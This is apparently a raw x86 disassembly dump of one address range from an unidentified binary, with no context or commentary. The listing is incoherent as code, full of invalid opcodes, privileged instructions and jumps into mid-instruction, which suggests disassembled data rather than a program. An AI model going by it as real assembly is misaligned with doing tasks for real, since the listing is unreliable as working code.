  41e678:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e679:	sub    edi,eax
  41e67b:	inc    esp
  41e67c:	mov    ebx,0x5f97aac0
  41e681:	sahf   
  41e682:	mov    dl,0x87
  41e684:	mov    esi,0xd0f63bb0
  41e689:	jb     0x41e69c
  41e68b:	push   0x2f
  41e68d:	dec    ebx
  41e68e:	(bad)
  41e691:	adc    eax,DWORD PTR [ebp+0x31]
  41e694:	int    0xf8
  41e696:	stos   DWORD PTR es:[edi],eax
  41e697:	cmc    
  41e698:	in     al,dx
  41e699:	and    DWORD PTR [eax-0x50],ecx
  41e69c:	sub    eax,0xd7cc5930
  41e6a1:	xchg   ecx,eax
  41e6a2:	shr    edx,cl
  41e6a4:	mov    al,0xa2
  41e6a6:	mov    eax,0x85f4d6dc
  41e6ab:	add    eax,0x896b10e3
  41e6b0:	pop    ss
  41e6b1:	rol    DWORD PTR [esi],cl
  41e6b3:	inc    ebp
  41e6b4:	cld    
  41e6b5:	xchg   esp,eax
  41e6b6:	mov    ss,WORD PTR [ebp-0x65ee9883]
  41e6bc:	xchg   ebp,eax
  41e6bd:	int    0xb0
  41e6bf:	cs leave 
  41e6c1:	hlt    
  41e6c2:	(bad)  
  41e6c3:	pop    edx
  41e6c4:	imul   eax,DWORD PTR [esi+ebx*4+0x2a],0x4646331a
  41e6cc:	mov    WORD PTR ds:0xce10fb71,es
  41e6d2:	and    eax,DWORD PTR [eax-0x32]
  41e6d5:	push   cs
  41e6d6:	test   DWORD PTR [edi],ebp
  41e6d8:	inc    eax
  41e6d9:	push   ss
  41e6da:	pop    edi
  41e6db:	push   ebx
  41e6dd:	sar    BYTE PTR [esi],cl
  41e6df:	outs   dx,BYTE PTR ds:[esi]
  41e6e0:	les    esi,FWORD PTR [esi+0x26fcd04c]
  41e6e6:	ins    BYTE PTR es:[edi],dx
  41e6e7:	fild   QWORD PTR [eax+0x9b7a8c8]
  41e6ed:	cli    
  41e6ee:	or     ebp,DWORD PTR [edi+eiz*2]
  41e6f1:	ret    0x4bc1
  41e6f4:	lock (bad) 
  41e6f6:	dec    ebp
  41e6f7:	dec    ebp
  41e6f8:	ins    DWORD PTR es:[edi],dx
  41e6f9:	pop    ebp
  41e6fa:	jbe    0x41e6ff
  41e6fc:	pop    edx
  41e6fd:	pop    eax
  41e6fe:	jne    0x41e76f
  41e700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e701:	jns    0x41e748
  41e703:	dec    ebx
  41e704:	cmp    BYTE PTR [edi+eiz*2],bh
  41e707:	pop    ecx
  41e708:	cld    
  41e709:	fadd   QWORD PTR [edx+0x206a4a64]
  41e70f:	fst    DWORD PTR [edx+edi*4-0x4311df61]
  41e716:	sub    BYTE PTR [eax+0x1c],al
  41e719:	mov    edi,0x62f7b331
  41e71e:	mov    dl,0xac
  41e720:	push   ds
  41e721:	repz add eax,0xbbc67eb2
  41e727:	retf   
  41e728:	daa    
  41e729:	pop    edx
  41e72a:	push   ds
  41e72b:	hlt    
  41e72c:	outs   dx,BYTE PTR ds:[esi]
  41e72d:	lods   al,BYTE PTR ds:[esi]
  41e72e:	loopne 0x41e6ea
  41e730:	mov    edx,0x60f13125
  41e735:	mov    gs,WORD PTR [esi-0x7e6d45d9]
  41e73b:	into   
  41e73c:	xor    edx,0x40
  41e73f:	sub    al,0xd
  41e741:	cwde   
  41e742:	aad    0x96
  41e744:	pop    esp
  41e745:	jecxz  0x41e6ca
  41e747:	adc    eax,0x41a0b3ae
  41e74c:	loop   0x41e783
  41e74e:	sub    eax,0x81eb479c
  41e753:	xchg   ecx,eax
  41e754:	add    ebp,DWORD PTR [ebx+0x751788ae]
  41e75a:	dec    eax
  41e75b:	cli    
  41e75c:	pop    ss
  41e75d:	ins    BYTE PTR es:[edi],dx
  41e75e:	mov    dh,0xce
  41e760:	repz inc edx
  41e762:	pop    ecx
  41e763:	fisttp DWORD PTR [ecx+ebx*8]
  41e766:	push   es
  41e767:	dec    ebx
  41e768:	xlat   BYTE PTR ds:[ebx]
  41e769:	inc    ebp
  41e76a:	add    DWORD PTR [edi+0x1712f3b0],eax
  41e770:	or     dl,al
  41e772:	mov    ah,0xbd
  41e774:	ret    0xfad6
  41e777:	xor    bl,dl
  41e779:	pop    ds
  41e77a:	sub    al,0xdc
  41e77c:	mov    DWORD PTR [eax+0x6f389cd9],ecx
  41e782:	mov    esi,DWORD PTR [ecx-0x53]
  41e785:	bound  ebp,QWORD PTR [eax+0x5b]
  41e788:	stc    
  41e789:	mov    ecx,0xac45afc8
  41e78e:	jle    0x41e76b
  41e790:	jp     0x41e7b0
  41e792:	std    
  41e793:	mov    cl,0x29
  41e795:	pushf  
  41e796:	inc    edx
  41e797:	ins    DWORD PTR es:[edi],dx
  41e798:	sbb    al,0x79
  41e79a:	jg     0x41e798
  41e79c:	or     eax,0xd1aaa89f
  41e7a1:	pop    ds
  41e7a2:	cmp    al,0x2
  41e7a4:	jns    0x41e820
  41e7a6:	sub    BYTE PTR [ebp+0x19a391d7],ah
  41e7ac:	sub    al,0xd
  41e7ae:	arpl   WORD PTR [ecx],bp
  41e7b0:	enter  0x60a,0x45
  41e7b4:	daa    
  41e7b5:	popa   
  41e7b6:	js     0x41e748
  41e7b8:	loop   0x41e78d
  41e7ba:	inc    ebx
  41e7bb:	daa    
  41e7bc:	mov    ecx,0x2db532b2
  41e7c1:	aad    0xa4
  41e7c3:	shl    al,1
  41e7c5:	data16 jne 0x41e74b
  41e7c8:	adc    eax,0xe5591ccc
  41e7cd:	into   
  41e7ce:	mov    edi,0xfb31e7bb
  41e7d3:	daa    
  41e7d4:	les    esp,FWORD PTR [ecx]
  41e7d6:	mov    al,ds:0xeece37d3
  41e7db:	pusha  
  41e7dc:	or     al,0x3b
  41e7de:	mov    ch,0x63
  41e7e0:	xchg   edx,eax
  41e7e1:	dec    ecx
  41e7e2:	jae    0x41e832
  41e7e4:	ins    DWORD PTR es:[edi],dx
  41e7e5:	imul   eax,DWORD PTR [ebx],0x32
  41e7e8:	sbb    DWORD PTR [ecx-0x3660eb91],esp
  41e7ee:	popa   
  41e7ef:	scas   eax,DWORD PTR es:[edi]
  41e7f0:	xchg   BYTE PTR [edi+0xaaab42b],bl
  41e7f6:	lods   eax,DWORD PTR ds:[esi]
  41e7f7:	lods   al,BYTE PTR ds:[esi]
  41e7f8:	dec    edx
  41e7f9:	outs   dx,DWORD PTR ds:[esi]
  41e7fa:	pop    eax
  41e7fb:	je     0x41e7f2
  41e7fd:	data16 and BYTE PTR [esi-0x4b],ch
  41e801:	shl    BYTE PTR [edx+0x781097a0],cl
  41e807:	mov    esp,0xc2288aec
  41e80c:	loopne 0x41e7c3
  41e80e:	jns    0x41e872
  41e810:	xchg   edx,eax
  41e811:	mov    al,0xea
  41e813:	call   0x420d:0xa47f8d23
  41e81a:	fnstcw WORD PTR [esp+eax*1-0x1368a376]
  41e821:	mov    esi,0xfc6eb650
  41e826:	xor    ebp,ebx
  41e828:	mov    DWORD PTR [ecx],edi
  41e82a:	push   edi
  41e82b:	pop    ebx
  41e82c:	and    ecx,DWORD PTR [edx+0x3a]
  41e82f:	pushf  
  41e830:	pop    es
  41e831:	test   al,0x7c
  41e833:	or     BYTE PTR [esp+edi*8+0x15],ah
  41e837:	fsubr  QWORD PTR [eax+0x24]
  41e83a:	mov    edx,0xc5c559db
  41e83f:	ins    BYTE PTR es:[edi],dx
  41e840:	dec    dx
  41e842:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e843:	and    DWORD PTR [ebp+edi*8+0xa],ebp
  41e847:	jnp    0x41e7fe
  41e849:	sahf   
  41e84a:	out    dx,eax
  41e84b:	das    
  41e84c:	inc    ecx
  41e84d:	xchg   ecx,eax
  41e84e:	push   esi
  41e84f:	pop    edi
  41e850:	idiv   DWORD PTR ds:0xa258934e
  41e856:	ss sysenter 
  41e859:	xor    edi,DWORD PTR [ebx]
  41e85b:	add    BYTE PTR [esi-0x32],0xdd
  41e85f:	inc    edi
  41e860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e861:	mov    bh,0xdd
  41e863:	scas   al,BYTE PTR es:[edi]
  41e864:	xor    ebx,DWORD PTR ds:0xbdd68104
  41e86a:	mov    ebp,0x3ef911ef
  41e86f:	push   esp
  41e870:	xchg   edx,eax
  41e871:	xchg   edi,eax
  41e872:	fs sbb al,0xd
  41e875:	dec    ebp
  41e876:	neg    BYTE PTR ds:0x38ce88e1
  41e87c:	inc    eax
  41e87d:	cld    
  41e87e:	mov    eax,ds:0xcf80a18c
  41e883:	xchg   esi,eax
  41e884:	das    
  41e885:	or     edx,DWORD PTR [esi]
  41e887:	dec    ecx
  41e888:	mov    bl,0x74
  41e88a:	xchg   edx,eax
  41e88b:	int    0xe3
  41e88d:	popa   
  41e88e:	mov    ecx,0x9f18cdb0
  41e893:	mov    DWORD PTR [esi+0x3ac46f05],edx
  41e899:	(bad)  
  41e89a:	push   esp
  41e89b:	mov    edi,ecx
  41e89d:	push   0x44
  41e89f:	push   edi
  41e8a0:	hlt    
  41e8a1:	and    al,0x79
  41e8a3:	and    bl,BYTE PTR [ebp+0x4c]
  41e8a6:	inc    ebx
  41e8a7:	mov    dh,0x2c
  41e8a9:	xchg   BYTE PTR [edi+ebp*8+0x42],dl
  41e8ad:	jae    0x41e8ca
  41e8af:	inc    esi
  41e8b0:	dec    ebp
  41e8b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8b2:	(bad)  
  41e8b3:	out    0xc3,eax
  41e8b5:	pop    ebx
  41e8b6:	or     eax,0xf78db3c9
  41e8bb:	mul    DWORD PTR [edx-0x2fbab2a3]
  41e8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c2:	in     al,0x3f
  41e8c4:	fnstsw WORD PTR [ebx]
  41e8c6:	call   0x5e06:0x199fcb40
  41e8cd:	and    al,0x30
  41e8cf:	xor    BYTE PTR [ecx],0xd7
  41e8d2:	mov    bh,0x8b
  41e8d4:	cld    
  41e8d5:	dec    ecx
  41e8d6:	inc    ebp
  41e8d7:	or     DWORD PTR [ebp+edi*1+0x62182f5e],edx
  41e8de:	xor    edx,edi
  41e8e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8e1:	sbb    eax,0xa317f7e5
  41e8e6:	push   0xf
  41e8e8:	and    eax,0x55be0834
  41e8ed:	fcomp  DWORD PTR [ebx+0x25b3678b]
  41e8f3:	push   esp
  41e8f4:	mov    dh,0x62
  41e8f6:	xchg   ebp,eax
  41e8f7:	mov    al,0x31
  41e8f9:	ins    BYTE PTR es:[edi],dx
  41e8fa:	fnstcw WORD PTR [esi]
  41e8fc:	shr    ch,0xe4
  41e8ff:	mov    bl,0x4f
  41e901:	jbe    0x41e970
  41e903:	cmp    esp,DWORD PTR [eax]
  41e905:	cdq    
  41e906:	enter  0x40c5,0xa9
  41e90a:	cmp    edx,DWORD PTR [ecx+0x4f]
  41e90d:	inc    ecx
  41e90e:	popf   
  41e90f:	xchg   edx,eax
  41e910:	dec    esp
  41e911:	mov    ebx,0x65ff43c0
  41e916:	imul   esi,ebx,0xffffffcb
  41e919:	icebp  
  41e91a:	sar    al,0x2b
  41e91d:	sbb    BYTE PTR [esi+0x43],0x86
  41e921:	jl     0x41e974
  41e923:	ja     0x41e9a0
  41e925:	imul   BYTE PTR [ebp+0x46]
  41e928:	aad    0x17
  41e92a:	cmp    al,0xa2
  41e92c:	pusha  
  41e92d:	hlt    
  41e92e:	mov    al,0xe
  41e930:	pusha  
  41e931:	gs enter 0xbfac,0x61
  41e936:	push   eax
  41e937:	pop    ebx
  41e938:	retf   0xcde4
  41e93b:	inc    edi
  41e93c:	ret    0x9f3d
  41e93f:	push   esi
  41e940:	dec    eax
  41e941:	or     eax,0xa70e660b
  41e946:	ret    
  41e947:	pop    esi
  41e948:	xor    BYTE PTR [eax],cl
  41e94a:	or     eax,0x8ee7ea77
  41e94f:	inc    edx
  41e950:	cld    
  41e951:	std    
  41e952:	inc    edi
  41e953:	std    
  41e954:	dec    esp
  41e955:	or     eax,0x1c951e81
  41e95a:	bound  ecx,QWORD PTR [edx]
  41e95c:	out    0x7c,al
  41e95e:	and    al,0xe9
  41e960:	cmp    esp,DWORD PTR [ebx]
  41e962:	ins    BYTE PTR es:[edi],dx
  41e963:	jl     0x41e954
  41e965:	adc    ch,BYTE PTR [eax]
  41e967:	in     al,0x95
  41e969:	xchg   ecx,eax
  41e96a:	lock xlat BYTE PTR ds:[ebx]
  41e96c:	inc    edx
  41e96d:	std    
  41e96e:	sbb    BYTE PTR [ebx],bl
  41e970:	adc    esi,ecx
  41e972:	push   ss
  41e973:	xchg   edi,eax
  41e974:	sbb    DWORD PTR [esi+0x72ee8647],0x60
  41e97b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e97c:	adc    al,0x2e
  41e97e:	jmp    0x41e977
  41e980:	je     0x41e934
  41e982:	aam    0x4b
  41e984:	or     edi,ebx
  41e986:	dec    ebp
  41e987:	imul   edx,DWORD PTR [ebp+0x7b],0x68facc5f
  41e98e:	sub    BYTE PTR ds:0x81fa7a3b,bh
  41e994:	lods   al,BYTE PTR ds:[esi]
  41e995:	fdivr  QWORD PTR [esi+0x1e]
  41e998:	outs   dx,DWORD PTR ds:[esi]
  41e999:	adc    al,0xd4
  41e99b:	stc    
  41e99c:	sub    ebp,DWORD PTR [edi-0x2ac74382]
  41e9a2:	into   
  41e9a3:	(bad)  
  41e9a4:	jp     0x41e9ae
  41e9a6:	dec    ebp
  41e9a7:	dec    ebp
  41e9a8:	mov    ebp,0x7009fd70
  41e9ad:	rol    BYTE PTR [eax],cl
  41e9af:	dec    ebx
  41e9b0:	or     dl,BYTE PTR [eax]
  41e9b2:	mov    bh,0x97
  41e9b4:	imul   ebx,ecx,0x2b1471d4
  41e9ba:	xor    DWORD PTR [edi],ebp
  41e9bc:	in     eax,dx
  41e9bd:	or     dl,BYTE PTR [esi+0x13229f2]
  41e9c3:	and    esi,DWORD PTR [ecx]
  41e9c5:	ins    DWORD PTR es:[edi],dx
  41e9c6:	sar    BYTE PTR [ecx-0x25714b70],0xf5
  41e9cd:	fild   WORD PTR [edx]
  41e9cf:	dec    edx
  41e9d0:	add    ebp,DWORD PTR [edi]
  41e9d2:	xchg   DWORD PTR [ebx-0x20],edx
  41e9d5:	xchg   esp,eax
  41e9d6:	pusha  
  41e9d7:	repz xlat BYTE PTR ds:[ebx]
  41e9da:	adc    BYTE PTR [eax-0x31d3998d],bl
  41e9e0:	mov    ds:0xd2f267b7,al
  41e9e5:	jno    0x41e9b9
  41e9e7:	push   0x33
  41e9e9:	xlat   BYTE PTR ds:[ebx]
  41e9ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9eb:	(bad)  
  41e9ec:	lock fwait
  41e9ee:	outs   dx,BYTE PTR ds:[esi]
  41e9ef:	cwde   
  41e9f0:	or     BYTE PTR [edi-0x6e],bh
  41e9f3:	nop
  41e9f4:	dec    esi
  41e9f5:	jl     0x41ea12
  41e9f7:	mov    ds:0x6c407627,al
  41e9fc:	rcr    DWORD PTR [ecx+0x33593d83],0xbb
  41ea03:	add    esp,esp
  41ea05:	fcmovnbe st,st(1)
  41ea07:	aam    0x55
  41ea09:	out    0x7e,al
  41ea0b:	jmp    0x7351:0x89d7fc5e
  41ea12:	pop    esp
  41ea13:	push   ebx
  41ea14:	inc    edi
  41ea15:	pop    eax
  41ea16:	ins    DWORD PTR es:[edi],dx
  41ea17:	and    al,0x43
  41ea19:	das    
  41ea1a:	stc    
  41ea1b:	mov    esp,0xf43b8fcb
  41ea20:	stos   BYTE PTR es:[edi],al
  41ea21:	loopne 0x41e9c7
  41ea23:	gs int 0xee
  41ea26:	sbb    al,al
  41ea28:	stos   DWORD PTR es:[edi],eax
  41ea29:	pop    esp
  41ea2a:	push   ecx
  41ea2b:	xor    ah,BYTE PTR [eax+0x58]
  41ea2e:	inc    ebx
  41ea2f:	pop    ecx
  41ea30:	into   
  41ea31:	mov    ds:0xca11966d,al
  41ea36:	jae    0x41e9dd
  41ea38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea39:	fild   DWORD PTR [ebx-0x466667d1]
  41ea3f:	push   0x35539111
  41ea44:	icebp  
  41ea45:	dec    edi
  41ea46:	pop    es
  41ea47:	cmp    esi,ecx
  41ea49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea4a:	jmp    0x41eac6
  41ea4c:	add    ah,BYTE PTR [edx+0x5e9d576a]
  41ea52:	xlat   BYTE PTR ds:[ebx]
  41ea53:	sbb    cl,BYTE PTR [ebx-0x3ff1dac0]
  41ea59:	dec    esi
  41ea5a:	cmp    BYTE PTR [ebx-0x4b],bh
  41ea5d:	(bad)  
  41ea5e:	(bad)  [ecx]
  41ea60:	mov    eax,eax
  41ea62:	and    DWORD PTR [ebp+ebp*1-0x46944310],esi
  41ea69:	push   edx
  41ea6a:	(bad)  
  41ea6b:	sbb    edx,DWORD PTR [ecx]
  41ea6d:	out    0xfb,eax
  41ea6f:	out    0x68,al
  41ea71:	int    0xab
  41ea73:	push   ds
  41ea74:	mov    eax,ds:0xacd19ad6
  41ea79:	mov    bl,BYTE PTR [esi]
  41ea7b:	and    eax,0xfd4fc49e
  41ea80:	sahf   
  41ea81:	push   esi
  41ea82:	rcr    edx,1
  41ea84:	outs   dx,DWORD PTR ds:[esi]
  41ea85:	(bad)  
  41ea86:	outs   dx,DWORD PTR ds:[esi]
  41ea87:	cmp    esi,DWORD PTR [edx]
  41ea89:	adc    BYTE PTR [ecx],0xe3
  41ea8c:	ficom  DWORD PTR [ebx*8+0x5eac6495]
  41ea93:	neg    BYTE PTR [ecx]
  41ea95:	std    
  41ea96:	int3   
  41ea97:	imul   edx,DWORD PTR [eax-0x2db1efe8],0xf2adb0b8
  41eaa1:	add    esp,eax
  41eaa3:	jmp    0xa44d:0x39e179c6
  41eaaa:	mov    ah,BYTE PTR [esi-0x2d20b56e]
  41eab0:	mov    esp,eax
  41eab2:	jg     0x41ea49
  41eab4:	sbb    al,0x3c
  41eab6:	jae    0x41eb2e
  41eab8:	jb     0x41ea3a
  41eaba:	stos   DWORD PTR es:[edi],eax
  41eabb:	push   esp
  41eabc:	ficomp WORD PTR [esi-0x1c]
  41eabf:	xor    ah,BYTE PTR [edx]
  41eac1:	cwde   
  41eac2:	lods   al,BYTE PTR ds:[esi]
  41eac3:	cli    
  41eac4:	loope  0x41ea99
  41eac6:	mov    ds:0x6587f342,eax
  41eacb:	push   eax
  41eacc:	add    BYTE PTR [eax-0x68],0x64
  41ead0:	push   cs
  41ead1:	pusha  
  41ead2:	inc    edx
  41ead3:	adc    BYTE PTR [eax+ebx*4-0x9],dl
  41ead7:	adc    BYTE PTR [edx-0x55],bl
  41eada:	dec    ebx
  41eadb:	or     ah,dh
  41eadd:	dec    esp
  41eade:	enter  0x2b26,0x40
  41eae2:	ret    
  41eae3:	ror    al,cl
  41eae5:	stos   DWORD PTR es:[edi],eax
  41eae6:	dec    edi
  41eae7:	sbb    ecx,DWORD PTR [ebx-0x769a3a5a]
  41eaed:	xchg   ecx,eax
  41eaee:	mov    edi,0x3c01493b
  41eaf3:	les    esi,FWORD PTR [esi]
  41eaf5:	cmc    
  41eaf6:	lahf   
  41eaf7:	sbb    eax,0x856568db
  41eafc:	sbb    dh,BYTE PTR [esi]
  41eafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eaff:	bound  eax,QWORD PTR [eax+0x5f]
  41eb02:	adc    eax,0xd5f5195f
  41eb07:	or     al,0x37
  41eb09:	mov    al,ds:0xb541b3fd
  41eb0e:	push   ds
  41eb0f:	xor    BYTE PTR [esi+eax*1+0x6b],bh
  41eb13:	in     eax,dx
  41eb14:	jne    0x41eb60
  41eb16:	retf   0xda61
  41eb19:	jae    0x41eaad
  41eb1b:	dec    ebx
  41eb1c:	es pop ebx
  41eb1e:	pop    edi
  41eb1f:	call   0xab91e05c
  41eb24:	pop    edx
  41eb25:	pop    esp
  41eb26:	test   BYTE PTR [ecx-0x25e01d3],bl
  41eb2c:	sub    ecx,edi
  41eb2e:	push   esi
  41eb2f:	mov    dl,0xc7
  41eb31:	add    al,0x89
  41eb33:	jg     0x41eb7a
  41eb35:	leave  
  41eb36:	clc    
  41eb37:	int3   
  41eb38:	cmp    ah,cl
  41eb3a:	inc    edx
  41eb3b:	loope  0x41ead0
  41eb3d:	ds jne 0x41eafd
  41eb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb41:	pop    esp
  41eb42:	adc    al,BYTE PTR [edi]
  41eb44:	loope  0x41eb0c
  41eb46:	pop    ds
  41eb47:	pop    esi
  41eb48:	cli    
  41eb49:	dec    eax
  41eb4a:	inc    eax
  41eb4b:	sub    BYTE PTR [edi+ebp*1+0x42d896d4],cl
  41eb52:	std    
  41eb53:	lods   al,BYTE PTR ds:[esi]
  41eb54:	pushf  
  41eb55:	dec    ecx
  41eb56:	sub    ah,BYTE PTR ds:0x26bcfffb
  41eb5c:	popa   
  41eb5d:	in     al,dx
  41eb5e:	sbb    ch,BYTE PTR [ecx]
  41eb60:	add    ah,BYTE PTR [edi-0x68fc38e3]
  41eb66:	sar    BYTE PTR [edi-0x12],0xda
  41eb6a:	pusha  
  41eb6b:	int3   
  41eb6c:	push   0x96b627a3
  41eb71:	data16 clc 
  41eb73:	int3   
  41eb74:	(bad)  
  41eb75:	adc    ebx,DWORD PTR [edi]
  41eb77:	pop    ecx
  41eb78:	call   0xe36a4f0f
  41eb7d:	scas   eax,DWORD PTR es:[edi]
  41eb7e:	jb     0x41eb19
  41eb80:	(bad)  
  41eb82:	gs popf 
  41eb84:	cmc    
  41eb85:	and    DWORD PTR [edi-0x5547a9cb],edi
  41eb8b:	inc    esp
  41eb8c:	cmc    
  41eb8d:	ds jo  0x41ec07
  41eb90:	ins    DWORD PTR es:[edi],dx
  41eb91:	inc    edi
  41eb92:	sbb    al,0x2b
  41eb94:	inc    eax
  41eb95:	xchg   edi,eax
  41eb96:	or     ebx,DWORD PTR [ebx]
  41eb98:	push   ss
  41eb99:	mov    esp,0x12a95f1e
  41eb9e:	iret   
  41eb9f:	out    dx,al
  41eba0:	mov    ch,0x6b
  41eba2:	outs   dx,BYTE PTR ds:[esi]
  41eba3:	sub    dl,BYTE PTR [ecx+0x70c2fac9]
  41eba9:	add    bh,BYTE PTR [ecx+0x65]
  41ebac:	test   al,0xa8
  41ebae:	pop    esp
  41ebaf:	outs   dx,BYTE PTR ds:[esi]
  41ebb0:	test   BYTE PTR [ebx+0x3f],bh
  41ebb3:	mov    eax,0x4dd792bb
  41ebb8:	inc    edx
  41ebb9:	push   ebp
  41ebba:	mov    edi,ecx
  41ebbc:	sti    
  41ebbd:	mov    ah,0xd
  41ebbf:	(bad)  
  41ebc0:	cld    
  41ebc1:	bound  esp,QWORD PTR [eax-0x44]
  41ebc4:	bound  ebp,QWORD PTR [esi-0x6d650509]
  41ebca:	inc    esp
  41ebcb:	add    bh,BYTE PTR [ecx+0x6affdb0f]
  41ebd1:	fwait
  41ebd2:	sub    ebx,DWORD PTR [esi-0x26]
  41ebd5:	pop    ss
  41ebd6:	push   edx
  41ebd7:	retf   0x788
  41ebda:	clc    
  41ebdb:	push   es
  41ebdc:	mov    edx,0xeef4e6a6
  41ebe1:	(bad)  
  41ebe2:	fwait
  41ebe3:	mov    bl,0xd4
  41ebe5:	(bad)  [eax-0x36e03759]
  41ebeb:	cmp    DWORD PTR [edx-0x2126f09c],eax
  41ebf1:	pop    ss
  41ebf2:	cmp    DWORD PTR ds:0x25e2160c,esi
  41ebf8:	retf   
  41ebf9:	fistp  DWORD PTR gs:0xe7dd6dfa
  41ec00:	add    ecx,DWORD PTR [ecx+0xa]
  41ec03:	sub    bh,al
  41ec05:	fsubr  QWORD PTR [edi+0x22]
  41ec08:	fdivrp st(5),st
  41ec0a:	or     eax,DWORD PTR ds:0x8bf91e0d
  41ec10:	inc    esi
  41ec11:	and    eax,0x76fe6817
  41ec16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec17:	add    edi,0xd73e2422
  41ec1d:	mov    dl,dh
  41ec1f:	push   0xa
  41ec21:	int3   
  41ec22:	and    edx,DWORD PTR [edx+0x72eb2e04]
  41ec28:	scas   al,BYTE PTR es:[edi]
  41ec29:	inc    edx
  41ec2a:	arpl   WORD PTR [ecx-0x24e48c5f],sp
  41ec30:	clc    
  41ec31:	sar    DWORD PTR [edi-0x18],cl
  41ec34:	cli    
  41ec35:	pop    esp
  41ec36:	ret    0x2868
  41ec39:	jns    0x41ebf5
  41ec3b:	or     bl,dh
  41ec3d:	dec    esi
  41ec3e:	lock (bad) 
  41ec40:	out    dx,al
  41ec41:	jnp    0x41ec50
  41ec43:	sbb    dl,ch
  41ec45:	imul   ebx,DWORD PTR [eax+0x19f4ee99],0x13
  41ec4c:	inc    esi
  41ec4d:	and    eax,0x8197cd33
  41ec52:	or     eax,0xdd65cb1
  41ec57:	mov    ?,edi
  41ec59:	inc    ebx
  41ec5a:	cmp    DWORD PTR [edx+0x49],edi
  41ec5d:	arpl   WORD PTR [ecx+0x66],sp
  41ec60:	inc    esi
  41ec61:	xor    bl,0xd4
  41ec64:	arpl   di,bp
  41ec66:	adc    al,0x70
  41ec68:	sti    
  41ec69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec6a:	sbb    al,0x5
  41ec6c:	aam    0xf4
  41ec6e:	cmp    esp,DWORD PTR [edx-0x15]
  41ec71:	js     0x41eccf
  41ec73:	ins    BYTE PTR es:[edi],dx
  41ec74:	and    eax,0x113dda9a
  41ec79:	jl     0x41ec64
  41ec7b:	push   ecx
  41ec7c:	and    BYTE PTR [ebp+0x5b],dl
  41ec7f:	xlat   BYTE PTR ds:[ebx]
  41ec80:	and    al,0x49
  41ec82:	icebp  
  41ec83:	aas    
  41ec84:	pop    ecx
  41ec85:	mov    al,ds:0x29c1e897
  41ec8a:	lds    esi,FWORD PTR [ebx+0xf47abb0]
  41ec90:	inc    ecx
  41ec91:	xor    BYTE PTR [esp+ebp*8+0x5f],0xed
  41ec96:	pusha  
  41ec97:	mov    esp,0x23e063fa
  41ec9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec9d:	aaa    
  41ec9e:	jge    0x41ecfb
  41eca0:	fidivr DWORD PTR [ebx-0x1d905c8e]
  41eca6:	stos   DWORD PTR es:[edi],eax
  41eca7:	push   esi
  41eca8:	shl    DWORD PTR [ecx],cl
  41ecaa:	lock in eax,dx
  41ecac:	jmp    0x41eca3
  41ecae:	(bad)  
  41ecaf:	loopne 0x41ecc5
  41ecb1:	sbb    ah,BYTE PTR ss:[esi+0x76]
  41ecb5:	sub    al,0x4d
  41ecb7:	mov    al,0x38
  41ecb9:	hlt    
  41ecba:	int    0xfa
  41ecbc:	daa    
  41ecbd:	(bad)  [ecx]
  41ecbf:	cmp    al,0x85
  41ecc1:	add    dl,ch
  41ecc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecc4:	fiadd  DWORD PTR [ebx-0x4e]
  41ecc7:	idiv   dl
  41ecc9:	loope  0x41ecaf
  41eccb:	in     al,dx
  41eccc:	mov    ebx,0x682fbb01
  41ecd1:	pop    ebp
  41ecd2:	mov    ebx,0x6447ef30
  41ecd7:	sbb    eax,0xca1c4baf
  41ecdc:	dec    ecx
  41ecdd:	xchg   ecx,eax
  41ecde:	loope  0x41ece8
  41ece0:	cmc    
  41ece1:	or     bl,al
  41ece3:	dec    edi
  41ece4:	fs push esp
  41ece6:	lea    ecx,[ecx+0x228a7062]
  41ecec:	push   esp
  41eced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecee:	xchg   edx,eax
  41ecef:	clc    
  41ecf0:	cmp    eax,0x83984628
  41ecf5:	gs push eax
  41ecf7:	push   cs
  41ecf8:	mov    edx,0xde2a1e1
  41ecfd:	shl    BYTE PTR [ebx-0xe1d0a44],0xa2
  41ed04:	sub    dl,BYTE PTR [edi]
  41ed06:	ins    DWORD PTR es:[edi],dx
  41ed07:	jle    0x41ed55
  41ed09:	cmp    DWORD PTR [edi-0x3c],esi
  41ed0c:	mov    bl,0xbc
  41ed0e:	mov    ebx,0xc020ccd3
  41ed13:	adc    al,0x8e
  41ed15:	(bad)  
  41ed16:	mov    ebp,0x4e9afaf9
  41ed1b:	mov    ds:0x49c4de7a,eax
  41ed20:	lea    ecx,[esi-0x3b]
  41ed23:	push   edx
  41ed24:	fisub  DWORD PTR [edi]
  41ed26:	(bad)  
  41ed27:	in     al,0xe3
  41ed29:	jg     0x41ed69
  41ed2b:	test   BYTE PTR [ebx+0x11],0x4e
  41ed2f:	inc    ebp
  41ed30:	dec    esi
  41ed31:	frstor es:[esi-0xb]
  41ed35:	dec    edx
  41ed36:	jmp    0x85c64791
  41ed3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed3c:	xor    BYTE PTR [edi+0x64],dh
  41ed3f:	mov    dl,0x64
  41ed41:	mov    ch,0xff
  41ed43:	xchg   DWORD PTR [ebx+0x36],esp
  41ed46:	cmp    BYTE PTR [eax+0x269fe52],al
  41ed4c:	mov    edx,0x3d6e60c9
  41ed51:	add    ch,al
  41ed53:	jne    0x41ed4e
  41ed55:	xchg   DWORD PTR [esi-0x5c],esp
  41ed58:	or     eax,0x25e9fb51
  41ed5d:	jae    0x41edaa
  41ed5f:	mov    edi,0x381e0601
  41ed64:	pop    ebx
  41ed65:	popf   
  41ed66:	out    0x61,eax
